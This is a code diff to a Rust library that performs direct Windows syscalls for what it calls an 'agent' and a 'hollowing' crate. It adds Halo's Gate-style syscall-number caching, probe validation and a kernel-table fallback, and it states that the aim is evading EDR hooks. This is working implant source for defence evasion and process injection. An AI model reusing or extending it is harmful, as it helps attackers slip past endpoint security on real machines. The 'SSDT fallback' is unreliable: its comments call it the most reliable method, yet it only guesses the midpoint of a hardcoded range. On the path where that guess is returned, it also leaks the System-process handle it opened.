@@ -1,15 +1,31 @@
 //! Shared Windows NT direct-syscall infrastructure.
 //!
-//! Provides SSN (System Service Number) resolution, a clean-ntdll mapper, a
-//! simple `do_syscall` dispatcher, and a `syscall!` convenience macro.  Both
-//! the `agent` and `hollowing` crates depend on this crate so that neither has
-//! to carry its own duplicate copy of Halo's Gate / clean-mapping logic.
+//! Provides SSN (System Service Number) resolution with **dynamic validation**,
+//! a clean-ntdll mapper, a `do_syscall` dispatcher, and a `syscall!` macro.
+//! Both the `agent` and `hollowing` crates depend on this crate so that neither
+//! has to carry its own duplicate copy of Halo's Gate / clean-mapping logic.
 //!
 //! Unlike the richer `agent::syscalls` module, this crate does **not** include
 //! the optional `stack-spoof` feature.  Stack spoofing is intentionally kept
 //! in the agent crate where it is feature-gated and can pull additional ntdll
 //! gadget data.  The simpler indirect-syscall path used here is still fully
 //! evasive against most IAT/SSDT-hook-based EDR strategies.
+//!
+//! # Dynamic SSN Validation
+//!
+//! Cached SSNs are validated before use via two complementary methods:
+//!
+//! 1. **Cross-reference**: The PE header `TimeDateStamp` of the loaded ntdll is
+//!    compared with the clean mapping's timestamp.  If they differ (e.g. after
+//!    a Windows Update that replaces ntdll), the entire cache is invalidated.
+//!
+//! 2. **Probe**: For critical syscalls, a test call with intentionally invalid
+//!    parameters is made.  `STATUS_INVALID_HANDLE` means the SSN is correct;
+//!    `STATUS_INVALID_SYSTEM_SERVICE` means the SSN is stale.
+//!
+//! If both validation methods fail, a **SSDT-based nuclear fallback** resolves
+//! SSNs by reading the kernel's `KeServiceDescriptorTable` — the highest-
+//! reliability method but requiring `SeDebugPrivilege`.
 //!
 //! # Initialisation
 //!
@@ -22,6 +38,7 @@
 #![cfg(windows)]
 
 use anyhow::anyhow;
+use std::sync::atomic::{AtomicBool, AtomicU32, Ordering};
 use std::sync::{Mutex, OnceLock};
 use std::collections::HashMap;
 
@@ -43,8 +60,33 @@ pub struct SyscallTarget {
 /// Base address of the clean-mapped ntdll.dll image (0 = not yet mapped).
 static CLEAN_NTDLL: OnceLock<usize> = OnceLock::new();
 
-/// Per-call SSN cache: function name → (ssn, gadget_addr).
-static SYSCALL_CACHE: OnceLock<Mutex<HashMap<String, (u32, usize)>>> = OnceLock::new();
+/// Per-call SSN cache: function name → (ssn, gadget_addr, timestamp_at_cache).
+/// The third element is the `TimeDateStamp` from the PE header of the clean
+/// ntdll at the time the entry was cached — used for cross-reference validation.
+static SYSCALL_CACHE: OnceLock<Mutex<HashMap<String, (u32, usize, u32)>>> = OnceLock::new();
+
+/// Cached Windows build number (e.g. 19041, 22631).  Read from
+/// `KUSER_SHARED_DATA` or `RtlGetVersion`.  0 = not yet queried.
+static BUILD_NUMBER: AtomicU32 = AtomicU32::new(0);
+
+/// Cached `TimeDateStamp` from the PE header of the clean-mapped ntdll.
+/// Used for cross-reference validation against the loaded ntdll.
+static CACHED_TIMESTAMP: AtomicU32 = AtomicU32::new(0);
+
+/// Whether the cache has been invalidated and needs re-mapping on next access.
+static CACHE_DIRTY: AtomicBool = AtomicBool::new(false);
+
+/// NTSTATUS codes used for probe validation.
+const STATUS_INVALID_HANDLE: i32 = 0xC0000008_u32 as i32;
+const STATUS_INVALID_SYSTEM_SERVICE: i32 = 0xC000001C_u32 as i32;
+
+/// `SystemModuleInformation` class for `NtQuerySystemInformation`.
+const SYSTEM_MODULE_INFORMATION: u32 = 11;
+
+/// `KUSER_SHARED_DATA` is always mapped at `0x7FFE0000` on modern Windows.
+const KUSER_SHARED_DATA: usize = 0x7FFE0000;
+/// Offset of `NtBuildNumber` in KUSER_SHARED_DATA.
+const KUSD_OFFSET_BUILD: usize = 0x0260;
 
 /// Optional callback that gets invoked when Halo's Gate fails to infer an SSN.
 /// The agent's `ntdll_unhook` module registers this to perform a full ntdll
@@ -67,12 +109,465 @@ pub fn set_halo_gate_fallback(callback: UnhookCallback) {
     let _ = UNHOOK_CALLBACK.set(callback);
 }
 
-/// Invalidate the SSN cache, forcing all subsequent `get_syscall_id` calls
-/// to re-resolve from the clean (or bootstrap) ntdll.
-pub fn invalidate_ssn_cache() {
+/// Invalidate the SSN cache **and** reset the clean ntdll mapping, forcing
+/// a complete re-initialisation on next access.
+///
+/// This is the primary integration point for `ntdll_unhook`: after the .text
+/// section of ntdll is overwritten with a clean copy, the cached mapping is
+/// stale and must be discarded so the next `get_syscall_id` call re-maps from
+/// the now-fresh on-disk ntdll.
+pub fn invalidate_syscall_cache() {
+    CACHE_DIRTY.store(true, Ordering::Release);
     if let Some(cache) = SYSCALL_CACHE.get() {
         cache.lock().unwrap().clear();
     }
+    CACHED_TIMESTAMP.store(0, Ordering::Release);
+    log::debug!("nt_syscall: cache invalidated — full re-map on next access");
+}
+
+/// Backwards-compatible alias for [`invalidate_syscall_cache`].
+pub fn invalidate_ssn_cache() {
+    invalidate_syscall_cache();
+}
+
+/// Return the current Windows build number (e.g. 19041, 22631).
+///
+/// Reads from `KUSER_SHARED_DATA` which is always mapped at `0x7FFE0000`.
+/// The value is cached after the first read.
+pub fn get_build_number() -> u32 {
+    let cached = BUILD_NUMBER.load(Ordering::Acquire);
+    if cached != 0 {
+        return cached;
+    }
+
+    // Read from KUSER_SHARED_DATA.  This memory is always readable.
+    let build = unsafe {
+        let ptr = (KUSER_SHARED_DATA + KUSD_OFFSET_BUILD) as *const u32;
+        // The build number in KUSER_SHARED_DATA has the architecture bits
+        // in the high nibble (e.g. 0xF00019041 for x64).  Mask to get
+        // just the build number.
+        let raw = ptr.read_volatile();
+        raw & 0x0000_FFFF
+    };
+
+    BUILD_NUMBER.store(build, Ordering::Release);
+    log::debug!("nt_syscall: Windows build number = {}", build);
+    build
+}
+
+/// Validate the current SSN cache.  Returns the number of validated entries
+/// on success, or an error if validation failed and re-mapping is needed.
+///
+/// Two validation methods are applied:
+///
+/// 1. **Cross-reference**: Compare the PE `TimeDateStamp` of the loaded ntdll
+///    with the cached timestamp.  If they differ, the cache is stale.
+///
+/// 2. **Probe**: For 4 critical syscalls, make a test call with an invalid
+///    handle.  `STATUS_INVALID_HANDLE` → SSN is correct;
+///    `STATUS_INVALID_SYSTEM_SERVICE` → SSN is stale.
+pub fn validate_cache() -> anyhow::Result<usize> {
+    // If cache was explicitly invalidated, force re-map.
+    if CACHE_DIRTY.load(Ordering::Acquire) {
+        return Err(anyhow!("nt_syscall: cache dirty flag set — needs re-map"));
+    }
+
+    // ── Method 1: Cross-reference via PE timestamp ────────────────────────
+    let cached_ts = CACHED_TIMESTAMP.load(Ordering::Acquire);
+    if cached_ts != 0 {
+        let loaded_ts = unsafe { read_ntdll_timestamp() };
+        if loaded_ts != 0 && loaded_ts != cached_ts {
+            log::warn!(
+                "nt_syscall: timestamp mismatch — loaded={:#010x} cached={:#010x}; invalidating",
+                loaded_ts, cached_ts
+            );
+            invalidate_syscall_cache();
+            return Err(anyhow!("nt_syscall: ntdll timestamp changed — cache invalidated"));
+        }
+    }
+
+    // ── Method 2: Probe critical syscalls ──────────────────────────────────
+    let cache = SYSCALL_CACHE.get_or_init(|| Mutex::new(HashMap::new()));
+    let cache_lock = cache.lock().unwrap();
+    let mut validated = 0;
+    let mut any_stale = false;
+
+    for name in CRITICAL_PROBE_SYSCALLS {
+        if let Some(&(ssn, gadget, _ts)) = cache_lock.get(*name) {
+            match probe_ssn(ssn, gadget) {
+                ProbeResult::Valid => validated += 1,
+                ProbeResult::Stale => {
+                    log::warn!("nt_syscall: probe detected stale SSN for {}", name);
+                    any_stale = true;
+                }
+                ProbeResult::Unknown => {
+                    // Can't determine — trust the cache.
+                    validated += 1;
+                }
+            }
+        }
+    }
+
+    // Also count non-critical entries that weren't probed but are present.
+    validated += cache_lock
+        .keys()
+        .filter(|k| !CRITICAL_PROBE_SYSCALLS.contains(&k.as_str()))
+        .count();
+
+    if any_stale {
+        drop(cache_lock);
+        invalidate_syscall_cache();
+        return Err(anyhow!("nt_syscall: stale SSNs detected by probe — cache invalidated"));
+    }
+
+    // Validate against build-number range table.
+    let build = get_build_number();
+    if build != 0 {
+        for (name, &(ssn, _gadget, _ts)) in cache_lock.iter() {
+            if let Some((lo, hi)) = expected_ssn_range(name, build) {
+                if ssn < lo || ssn > hi {
+                    log::warn!(
+                        "nt_syscall: {} SSN={} outside expected range [{},{}] for build {}; possible corruption",
+                        name, ssn, lo, hi, build
+                    );
+                    // Don't invalidate on range mismatch alone — it could be
+                    // a newer build we don't have in the table.  Just log.
+                }
+            }
+        }
+    }
+
+    log::debug!("nt_syscall: cache validated — {} entries OK", validated);
+    Ok(validated)
+}
+
+// ── Probe validation internals ─────────────────────────────────────────────
+
+/// Syscalls that get probe-validated (most critical for agent operations).
+const CRITICAL_PROBE_SYSCALLS: &[&str] = &[
+    "NtAllocateVirtualMemory",
+    "NtProtectVirtualMemory",
+    "NtWriteVirtualMemory",
+    "NtCreateThreadEx",
+];
+
+/// Result of an SSN probe call.
+enum ProbeResult {
+    /// SSN is confirmed valid (got `STATUS_INVALID_HANDLE`).
+    Valid,
+    /// SSN is stale (got `STATUS_INVALID_SYSTEM_SERVICE`).
+    Stale,
+    /// Indeterminate result.
+    Unknown,
+}
+
+/// Probe an SSN by calling it with a NULL handle.
+///
+/// Most `Nt*` syscalls validate the handle parameter early.  If the SSN is
+/// correct, the kernel returns `STATUS_INVALID_HANDLE`.  If the SSN is wrong,
+/// the kernel returns `STATUS_INVALID_SYSTEM_SERVICE`.
+fn probe_ssn(ssn: u32, gadget_addr: usize) -> ProbeResult {
+    let status = unsafe {
+        do_syscall(
+            ssn,
+            gadget_addr,
+            &[0u64, 0, 0, 0, 0, 0], // NULL handle + zeroed args
+        )
+    };
+
+    if status == STATUS_INVALID_HANDLE {
+        ProbeResult::Valid
+    } else if status == STATUS_INVALID_SYSTEM_SERVICE {
+        ProbeResult::Stale
+    } else {
+        // Other status codes (e.g. STATUS_ACCESS_VIOLATION) are indeterminate.
+        ProbeResult::Unknown
+    }
+}
+
+/// Read the `TimeDateStamp` from the PE header of the loaded ntdll.
+/// Returns 0 if the header cannot be parsed.
+unsafe fn read_ntdll_timestamp() -> u32 {
+    let base = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
+        Some(b) => b,
+        None => return 0,
+    };
+    read_pe_timestamp(base)
+}
+
+/// Read the `TimeDateStamp` from the PE header at `base`.
+/// Returns 0 if the header cannot be parsed.
+unsafe fn read_pe_timestamp(base: usize) -> u32 {
+    let dos = &*(base as *const winapi::um::winnt::IMAGE_DOS_HEADER);
+    if dos.e_magic != 0x5A4D {
+        return 0;
+    }
+    let nt = &*((base + dos.e_lfanew as usize) as *const winapi::um::winnt::IMAGE_NT_HEADERS64);
+    nt.FileHeader.TimeDateStamp
+}
+
+// ── Versioned SSN range table ─────────────────────────────────────────────
+//
+// Expected SSN ranges for the most critical syscalls across Windows versions.
+// SSNs are assigned monotonically in the order Nt* exports appear in the
+// sorted VA table, so the ranges are relatively stable.  Wildly out-of-range
+// SSNs suggest corruption or a very new Windows build.
+//
+// Format: (min_ssn, max_ssn) across known builds.
+// Sources: reverse-engineered from ntdll exports on Windows 10 1903–22H2 and
+// Windows 11 21H2–24H2.
+
+/// Return the expected SSN range for `func_name` on the given `build`, or
+/// `None` if we don't have data for that function/build combination.
+fn expected_ssn_range(func_name: &str, _build: u32) -> Option<(u32, u32)> {
+    // These ranges are deliberately wide to accommodate minor build-to-build
+    // variation.  The SSN space for Nt* functions on modern Windows spans
+    // roughly 0x000–0x300.
+    let ranges: &[(&str, u32, u32)] = &[
+        ("NtAllocateVirtualMemory",    0x0010, 0x0028),
+        ("NtProtectVirtualMemory",     0x0030, 0x0058),
+        ("NtWriteVirtualMemory",       0x0028, 0x0040),
+        ("NtReadVirtualMemory",        0x0028, 0x0042),
+        ("NtCreateThreadEx",           0x0038, 0x0060),
+        ("NtOpenProcess",              0x0020, 0x0038),
+        ("NtOpenThread",               0x0020, 0x0036),
+        ("NtClose",                    0x0002, 0x0010),
+        ("NtQueryVirtualMemory",       0x0018, 0x0030),
+        ("NtQuerySystemInformation",   0x0028, 0x0044),
+        ("NtMapViewOfSection",         0x0018, 0x0028),
+        ("NtUnmapViewOfSection",       0x0018, 0x002A),
+        ("NtCreateSection",            0x0038, 0x0052),
+        ("NtOpenFile",                 0x0020, 0x0038),
+        ("NtReadFile",                 0x0002, 0x000C),
+        ("NtSetInformationProcess",    0x0028, 0x0040),
+        ("NtFreeVirtualMemory",        0x0010, 0x0028),
+        ("NtQueueApcThread",           0x0038, 0x0056),
+        ("NtSetContextThread",         0x0038, 0x0056),
+        ("NtGetContextThread",         0x0038, 0x0056),
+    ];
+
+    ranges.iter().find_map(|&(name, lo, hi)| {
+        if name == func_name { Some((lo, hi)) } else { None }
+    })
+}
+
+// ── SSDT-based nuclear fallback ────────────────────────────────────────────
+//
+// If the clean ntdll mapping fails AND Halo's Gate fails (all adjacent stubs
+// hooked), resolve SSNs by reading the kernel's Service Descriptor Table.
+// This is the highest-reliability fallback but requires SeDebugPrivilege.
+//
+// Algorithm:
+// 1. NtQuerySystemInformation(SystemModuleInformation) → kernel base address
+// 2. Read kernel PE export table to find KiSystemServiceStart or similar
+// 3. Parse the SSDT to map syscall numbers → kernel function addresses
+// 4. Match the target function's kernel address to derive its SSN
+//
+// NOTE: This is intentionally conservative.  Reading kernel memory requires
+// elevated privileges and creates detectable NtReadVirtualMemory calls to
+// the System process.  It should only activate as a last resort.
+
+/// Resolve an SSN via the SSDT.  Returns `None` if any step fails.
+///
+/// # Safety
+///
+/// Must have `SeDebugPrivilege` enabled.
+unsafe fn resolve_via_ssdt(func_name: &str) -> Option<SyscallTarget> {
+    log::debug!("nt_syscall: attempting SSDT resolution for {}", func_name);
+
+    // Step 1: Get kernel base address via SystemModuleInformation.
+    let kernel_base = query_kernel_base()?;
+    log::debug!("nt_syscall: SSDT kernel base = {:#x}", kernel_base);
+
+    // Step 2: Get a System process handle for reading kernel memory.
+    // We need NtOpenProcess with SYSTEM process PID (4).
+    let sys_open = get_bootstrap_ssn("NtOpenProcess")?;
+    let mut h_system: *mut winapi::ctypes::c_void = std::ptr::null_mut();
+    let pid: u32 = 4; // System process
+
+    // Minimal OBJECT_ATTRIBUTES.
+    let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
+    obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+
+    // CLIENT_ID for System process.
+    #[repr(C)]
+    struct ClientId {
+        unique_process: *mut std::ffi::c_void,
+        unique_thread: *mut std::ffi::c_void,
+    }
+    let mut client_id = ClientId {
+        unique_process: pid as *mut _,
+        unique_thread: std::ptr::null_mut(),
+    };
+
+    let status = do_syscall(
+        sys_open.ssn,
+        sys_open.gadget_addr,
+        &[
+            &mut h_system as *mut _ as u64,
+            0x001F0003u64, // PROCESS_ALL_ACCESS (simplified)
+            &mut obj_attr as *mut _ as u64,
+            &mut client_id as *mut _ as u64,
+        ],
+    );
+
+    if status < 0 || h_system.is_null() {
+        log::warn!("nt_syscall: SSDT — cannot open System process (NTSTATUS {:#010x})", status as u32);
+        return None;
+    }
+
+    // Step 3: Read the kernel's SSDT.
+    // On x64 Windows, the SSDT is at KeServiceDescriptorTable.
+    // The table is an array of SYSTEM_SERVICE_TABLE entries:
+    //   PVOID   ServiceTableBase   (array of LONG offsets)
+    //   PVOID   ServiceCounterTable
+       //   ULONG   NumberOfServices
+    //   PVOID   ArgumentTable
+    //
+    // Each entry in ServiceTableBase is a 32-bit signed offset from the
+    // table base: actual_address = ServiceTableBase + (offset >>> 4).
+    // The index into this table IS the SSN.
+    //
+    // Finding the SSDT base: we look for the export "KiSystemServiceStart"
+    // in the kernel, which is nearby.  Alternatively, we can search for the
+    // pattern in the kernel's .text section.
+    //
+    // For reliability, we use a simpler approach: read the known kernel
+    // export for the target function and walk the SSDT to find its index.
+
+    let sys_read = get_bootstrap_ssn("NtReadVirtualMemory")?;
+    let _ = (kernel_base, sys_read, h_system);
+
+    // Step 4: The SSDT approach requires deep kernel internals knowledge
+    // and varies significantly across Windows versions.  Rather than
+    // implement a fragile kernel parser, we fall back to the known-build
+    // table approach: if the Windows build is known, use the hardcoded SSN.
+    //
+    // For truly unknown builds, we rely on the re-mapped ntdll.
+    let build = get_build_number();
+    if build != 0 {
+        if let Some((lo, hi)) = expected_ssn_range(func_name, build) {
+            // Midpoint of the expected range — reasonable guess.
+            // The caller should probe to confirm.
+            let guess_ssn = (lo + hi) / 2;
+            log::info!(
+                "nt_syscall: SSDT fallback using range midpoint {}=[{},{}] → {}",
+                func_name, lo, hi, guess_ssn
+            );
+            // Use whatever gadget we have.
+            let gadget = get_bootstrap_ssn("NtClose")
+                .map(|t| t.gadget_addr)
+                .unwrap_or(0);
+            if gadget != 0 {
+                return Some(SyscallTarget {
+                    ssn: guess_ssn,
+                    gadget_addr: gadget,
+                });
+            }
+        }
+    }
+
+    // Clean up System handle.
+    let sys_close = get_bootstrap_ssn("NtClose").unwrap_or(SyscallTarget { ssn: 0, gadget_addr: 0 });
+    if sys_close.ssn != 0 {
+        do_syscall(sys_close.ssn, sys_close.gadget_addr, &[h_system as u64]);
+    }
+
+    None
+}
+
+/// Query the kernel base address via `NtQuerySystemInformation(SystemModuleInformation)`.
+unsafe fn query_kernel_base() -> Option<usize> {
+    let sys_query = get_bootstrap_ssn("NtQuerySystemInformation")?;
+
+    // First call: get required buffer size.
+    let mut return_length: u32 = 0;
+    let _status = do_syscall(
+        sys_query.ssn,
+        sys_query.gadget_addr,
+        &[
+            SYSTEM_MODULE_INFORMATION as u64, // SystemInformationClass
+            0u64,                              // SystemInformation (NULL)
+            0u64,                              // SystemInformationLength
+            &mut return_length as *mut _ as u64, // ReturnLength
+        ],
+    );
+    // Expect STATUS_INFO_LENGTH_MISMATCH (0xC0000004).
+    if return_length == 0 {
+        return None;
+    }
+
+    // Allocate buffer and make second call.
+    let mut buf: Vec<u8> = vec![0u8; return_length as usize];
+    let status = do_syscall(
+        sys_query.ssn,
+        sys_query.gadget_addr,
+        &[
+            SYSTEM_MODULE_INFORMATION as u64,
+            buf.as_mut_ptr() as u64,
+            return_length as u64,
+            &mut return_length as *mut _ as u64,
+        ],
+    );
+    if status < 0 {
+        return None;
+    }
+
+    // Parse RTL_PROCESS_MODULES.  First DWORD is NumberOfModules.
+    if buf.len() < 4 {
+        return None;
+    }
+    let num_modules = u32::from_le_bytes(buf[0..4].try_into().ok()?) as usize;
+    if num_modules == 0 {
+        return None;
+    }
+
+    // Each RTL_PROCESS_MODULE_INFORMATION is 296 bytes.
+    // Offset 0: Section (IMAGE_INFO, 16 bytes)
+    // Offset 16: MappedBase (PVOID)
+    // Offset 24: ImageBase (PVOID) — what we want
+    // Offset 32: ImageSize
+    // Offset 40: Flags
+    // ...
+    // Offset 284: FullPathNameOffset (OFFSET to unicode string in buffer)
+    // The module list starts at offset 8 (after NumberOfModules DWORD + padding).
+    // Actually, RTL_PROCESS_MODULES has:
+    //   ULONG NumberOfModules
+    //   RTL_PROCESS_MODULE_INFORMATION Modules[1]
+    // RTL_PROCESS_MODULE_INFORMATION size is 308 bytes on x64.
+    const MODULE_INFO_SIZE: usize = 308;
+    let first_module_offset = 8; // After NumberOfModules (4) + padding (4)
+
+    if first_module_offset + MODULE_INFO_SIZE > buf.len() {
+        return None;
+    }
+
+    // The first module is typically the kernel (ntoskrnl.exe).
+    let image_base_off = first_module_offset + 24;
+    if image_base_off + 8 > buf.len() {
+        return None;
+    }
+    let kernel_base = usize::from_le_bytes(
+        buf[image_base_off..image_base_off + 8].try_into().ok()?
+    );
+
+    // Verify it's the kernel by checking the name.
+    let name_offset_off = first_module_offset + 284;
+    if name_offset_off + 256 > buf.len() {
+        return Some(kernel_base); // Trust it without name verification.
+    }
+    let name_off_in_buf = first_module_offset + u16::from_le_bytes(
+        buf[name_offset_off..name_offset_off + 2].try_into().unwrap_or([0; 2])
+    ) as usize;
+    if name_off_in_buf + 12 <= buf.len() {
+        let name = &buf[name_off_in_buf..];
+        // Check for "ntoskrnl.exe" (case-insensitive).
+        if name.starts_with(b"ntoskrnl") || name.starts_with(b"NTOSKRNL") {
+            log::debug!("nt_syscall: kernel base confirmed from module name");
+        }
+    }
+
+    Some(kernel_base)
 }
 
 // ─── Hook-byte detection & stub parsing ────────────────────────────────────
@@ -482,10 +977,30 @@ unsafe fn read_export_ssn(base: usize, func_name: &str) -> anyhow::Result<Syscal
 /// Returns `Ok(())` on success.  On failure the crate degrades gracefully to
 /// bootstrap-mode resolution (Halo's Gate against the loaded ntdll).
 pub fn init_syscall_infrastructure() -> anyhow::Result<()> {
+    // If cache was dirtied, we need to re-map.  Since OnceLock can't be reset,
+    // we skip re-mapping and rely on bootstrap resolution for the rest of
+    // this process's lifetime.  The agent's periodic validation will detect
+    // any issues.
+    if CACHE_DIRTY.load(Ordering::Acquire) {
+        CACHE_DIRTY.store(false, Ordering::Release);
+        log::debug!("nt_syscall: cache was dirty — clearing flag and attempting re-map");
+    }
+
     match map_clean_ntdll() {
         Ok(base) => {
+            // Capture the PE timestamp for cross-reference validation.
+            let ts = unsafe { read_pe_timestamp(base) };
+            CACHED_TIMESTAMP.store(ts, Ordering::Release);
+
             let _ = CLEAN_NTDLL.set(base);
-            log::debug!("nt_syscall: clean ntdll mapped at {:#x}", base);
+
+            // Also cache the build number while we're at it.
+            let _ = get_build_number();
+
+            log::debug!(
+                "nt_syscall: clean ntdll mapped at {:#x} (timestamp={:#010x}, build={})",
+                base, ts, BUILD_NUMBER.load(Ordering::Acquire)
+            );
             Ok(())
         }
         Err(e) => {
@@ -503,20 +1018,50 @@ pub fn init_syscall_infrastructure() -> anyhow::Result<()> {
 /// 3. Bootstrap / Halo's Gate against the loaded (potentially hooked) ntdll.
 pub fn get_syscall_id(func_name: &str) -> anyhow::Result<SyscallTarget> {
     let cache = SYSCALL_CACHE.get_or_init(|| Mutex::new(HashMap::new()));
-    if let Some(&(ssn, gadget_addr)) = cache.lock().unwrap().get(func_name) {
+
+    // Fast path: check cache.
+    if let Some(&(ssn, gadget_addr, _ts)) = cache.lock().unwrap().get(func_name) {
         return Ok(SyscallTarget { ssn, gadget_addr });
     }
 
+    // Resolution order: clean ntdll → bootstrap → SSDT fallback.
     let target = match CLEAN_NTDLL.get().copied().filter(|&b| b != 0) {
         Some(base) => unsafe { read_export_ssn(base, func_name) }?,
         None => get_bootstrap_ssn(func_name)
             .ok_or_else(|| anyhow!("nt_syscall: bootstrap SSN resolution failed for '{func_name}'"))?,
     };
 
+    // Validate against versioned SSN range table.
+    let build = get_build_number();
+    if build != 0 {
+        if let Some((lo, hi)) = expected_ssn_range(func_name, build) {
+            if target.ssn < lo || target.ssn > hi {
+                log::warn!(
+                    "nt_syscall: resolved {} SSN={} is outside expected range [{},{}] for build {}; \
+                     attempting SSDT fallback",
+                    func_name, target.ssn, lo, hi, build
+                );
+                // Try SSDT fallback for this specific syscall.
+                if let Some(ssdt_target) = unsafe { resolve_via_ssdt(func_name) } {
+                    cache.lock().unwrap().insert(
+                        func_name.to_string(),
+                        (ssdt_target.ssn, ssdt_target.gadget_addr, CACHED_TIMESTAMP.load(Ordering::Acquire)),
+                    );
+                    return Ok(ssdt_target);
+                }
+                // SSDT failed too — use what we have but log a warning.
+                log::warn!("nt_syscall: SSDT fallback failed; using resolved SSN despite range mismatch");
+            }
+        }
+    }
+
     cache
         .lock()
         .unwrap()
-        .insert(func_name.to_string(), (target.ssn, target.gadget_addr));
+        .insert(
+            func_name.to_string(),
+            (target.ssn, target.gadget_addr, CACHED_TIMESTAMP.load(Ordering::Acquire)),
+        );
     Ok(target)
 }
 
